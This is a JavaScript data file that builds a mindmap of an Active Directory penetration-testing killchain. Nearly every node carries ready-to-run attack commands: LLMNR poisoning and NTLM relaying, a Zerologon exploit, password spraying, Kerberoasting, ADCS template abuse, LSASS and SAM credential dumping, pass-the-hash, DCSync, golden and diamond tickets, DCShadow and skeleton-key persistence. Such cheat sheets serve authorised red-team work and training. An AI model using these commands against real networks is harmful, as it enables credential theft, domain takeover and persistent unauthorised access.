(() => {
  const createNode = (id, label, description, commands, type='technique', icon, children=[], resources=[]) => ({
    id,
    data: { label, description, commands, type, icon, resources },
    children
  });

  // Based on Mayfly's AD Mindmap structure
  window.MINDMAP_AD_TREE = createNode('ad-root', 'AD Pentest', 'Active Directory Killchain', [], 'root', 'Castle', [
    // BRANCH 1: NO CREDENTIALS
    createNode('no-creds', 'No Credentials', 'Network Attacks & Exploits', [], 'category', 'Lock', [
      createNode('mitm', 'MITM & Poisoning', 'LLMNR, NBT-NS, mDNS', [], 'category', 'Radio', [
        createNode('responder', 'Responder', 'Capture Hashes', [
          { description: 'Analyze', code: 'responder -I eth0 -A' },
          { description: 'Run', code: 'responder -I eth0 -dwv' }
        ], 'tool', 'Radio'),
        createNode('mitm6', 'IPv6 Attacks', 'DNS Takeover', [
          { description: 'Attack', code: 'mitm6 -d domain.local' }
        ], 'technique', 'Network'),
        createNode('smb-relay', 'SMB Relay', 'Relay to Shell', [
          { description: 'Check Signing', code: 'nmap --script smb2-security-mode -p 445 target' },
          { description: 'Relay (Socks)', code: 'ntlmrelayx.py -tf targets.txt -socks -smb2support' }
        ], 'technique', 'ArrowRight')
      ]),
      createNode('vulns', 'Exploits', 'Unauthenticated RCE/PrivEsc', [], 'category', 'Bomb', [
        createNode('zerologon', 'Zerologon', 'CVE-2020-1472', [
          { description: 'Test', code: 'zerologon_tester.py domain dc01' },
          { description: 'Exploit', code: 'set_empty_pw.py domain/dc01' }
        ], 'technique', 'Zap'),
        createNode('petitpotam', 'PetitPotam', 'Coerce Auth', [
          { description: 'Coerce', code: 'PetitPotam.exe listening_ip target_ip' }
        ], 'technique', 'Magnet')
      ]),
      createNode('pass-spray', 'Password Spray', 'Guessing Commons', [
        { description: 'Kerbrute', code: 'kerbrute userenum users.txt -d domain.local' },
        { description: 'Spray', code: 'crackmapexec smb ips.txt -u users.txt -p "Password123"' }
      ], 'technique', 'Users')
    ]),

    // BRANCH 2: COMPROMISED USER
    createNode('user-access', 'Compromised User', 'Enumeration & Escalation', [], 'category', 'User', [
      createNode('enum', 'Enumeration', 'Mapping', [], 'category', 'Map', [
        createNode('bloodhound', 'BloodHound', 'Graph Analysis', [
          { description: 'Ingestor', code: 'SharpHound.exe -c All' }
        ], 'tool', 'Share2', [], [{title: 'BloodHound', url: 'https://github.com/BloodHoundAD/BloodHound'}]),
        createNode('snaffler', 'Snaffler', 'File Share Mining', [
          { description: 'Run', code: 'Snaffler.exe -s -d domain.local -o results.txt -v data' }
        ], 'tool', 'Search'),
        createNode('ad-explorer', 'AD Explorer', 'GUI Browser', [], 'tool', 'Eye')
      ]),

      createNode('kerberos-attacks', 'Kerberos Attacks', 'Ticket Abuse', [], 'category', 'Flame', [
        createNode('kerberoast', 'Kerberoasting', 'Service Accounts', [
          { description: 'Rubeus', code: 'Rubeus.exe kerberoast /nowrap' },
          { description: 'Impacket', code: 'GetUserSPNs.py -request' }
        ], 'technique', 'Flame'),
        createNode('asrep', 'AS-REP Roasting', 'No Pre-Auth', [
          { description: 'Rubeus', code: 'Rubeus.exe asreproast /nowrap' }
        ], 'technique', 'Unlock')
      ]),

      createNode('adcs', 'ADCS', 'Certificate Services', [], 'category', 'Ticket', [
        createNode('certify', 'Enumeration', 'Find Vulnerable Templates', [
          { description: 'Find', code: 'Certify.exe find /vulnerable' }
        ], 'tool', 'Search'),
        createNode('esc1', 'ESC1', 'Domain Admin via Template', [
          { description: 'Request', code: 'Certify.exe request /ca:CA01 /template:VulnTemplate /altname:Administrator' }
        ], 'technique', 'Key'),
        createNode('esc8', 'ESC8', 'NTLM Relay to HTTP API', [
          { description: 'Relay', code: 'ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs' }
        ], 'technique', 'ArrowRight')
      ]),

      createNode('acl-abuse', 'ACL Abuse', 'Permissions', [], 'category', 'Shield', [
        createNode('generic-all', 'GenericAll', 'Full Control', [
          { description: 'Add User', code: 'net group "Domain Admins" eviluser /add /domain' },
          { description: 'Reset Pass', code: 'net user targetuser NewPass123! /domain' }
        ], 'technique', 'Unlock'),
        createNode('dcsync-rights', 'DCSync Rights', 'WriteDacl', [
          { description: 'Grant Rights', code: 'PowerView: Add-ObjectAcl -Target "DC=domain,DC=local" -Principal "User" -Rights DCSync' }
        ], 'technique', 'Download')
      ]),

      createNode('gpo-abuse', 'GPO Abuse', 'Group Policy', [], 'category', 'File', [
        createNode('edit-gpo', 'Edit GPO', 'Scheduled Task/Startup Script', [
          { description: 'SharpGPOAbuse', code: 'SharpGPOAbuse.exe --AddComputerTask --TaskName "Evil" --Author "Me" --Command "cmd.exe" --Args "/c powerhshell ..."' }
        ], 'technique', 'Code')
      ])
    ]),

    // BRANCH 3: LATERAL MOVEMENT
    createNode('lateral', 'Lateral Movement', 'Pivoting & Harvesting', [], 'category', 'Repeat', [
      createNode('dumping', 'Credential Dumping', 'Memory & Disk', [], 'category', 'Database', [
        createNode('lsass', 'LSASS', 'Memory Dump', [
          { description: 'Mimikatz', code: 'sekurlsa::logonpasswords' },
          { description: 'Nanodump', code: 'nanodump.exe' },
          { description: 'ProcDump', code: 'procdump.exe -ma lsass.exe' }
        ], 'technique', 'Cpu'),
        createNode('sam', 'SAM/SYSTEM', 'Local Hives', [
          { description: 'Save Hives', code: 'reg save HKLM\\SAM sam & reg save HKLM\\SYSTEM sys' },
          { description: 'Extract', code: 'secretsdump.py -sam sam -system sys LOCAL' }
        ], 'technique', 'File')
      ]),

      createNode('movement', 'Execution', 'Remote Code', [], 'category', 'Terminal', [
        createNode('pth', 'Pass The Hash', 'NTLM Injection', [
          { description: 'Evil-WinRM', code: 'evil-winrm -i ip -u user -H hash' },
          { description: 'Mimikatz', code: 'sekurlsa::pth /user:user /domain:dom /ntlm:hash' }
        ], 'technique', 'Hash'),
        createNode('wmi-smb', 'WMI / SMB', 'Service Exec', [
          { description: 'WMIExec', code: 'wmiexec.py domain/user@ip' },
          { description: 'PsExec', code: 'psexec.py domain/user@ip' }
        ], 'technique', 'Terminal'),
        createNode('winrm', 'WinRM', 'PowerShell Remoting', [
          { description: 'Enter-PSSession', code: 'Enter-PSSession -ComputerName target' }
        ], 'technique', 'Terminal')
      ]),

      createNode('token-abuse', 'Token Abuse', 'Impersonation', [
        { description: 'Incognito', code: 'list_tokens -u; impersonate_token "DOMAIN\\Admin"' }
      ], 'technique', 'User')
    ]),

    // BRANCH 4: DOMAIN DOMINANCE
    createNode('dominance', 'Domain Dominance', 'Persistence & Control', [], 'category', 'Crown', [
      createNode('dcsync', 'DCSync', 'Replicate Secrets', [
        { description: 'SecretsDump', code: 'secretsdump.py domain/admin@dc_ip -just-dc-ntlm' },
        { description: 'Mimikatz', code: 'lsadump::dcsync /domain:domain.local /user:krbtgt' }
      ], 'technique', 'Download'),
      createNode('golden-ticket', 'Golden Ticket', 'Forge TGT', [
        { description: 'Mimikatz', code: 'kerberos::golden /user:Administrator /domain:dom /sid:S-1-5-.. /krbtgt:hash /id:500' }
      ], 'technique', 'Ticket'),
      createNode('diamond-ticket', 'Diamond Ticket', 'Request TGT & Modify', [
        { description: 'Rubeus', code: 'Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512' }
      ], 'technique', 'Ticket'),
      createNode('dcshadow', 'DCShadow', 'Rogue DC Replication', [
        { description: 'Mimikatz', code: 'lsadump::dcshadow /object:target /attribute:description /value="Pwned"' }
      ], 'technique', 'Globe'),
      createNode('skeleton-key', 'Skeleton Key', 'Master Password', [
        { description: 'Mimikatz', code: 'misc::skeleton' }
      ], 'technique', 'Key')
    ])
  ]);
})();
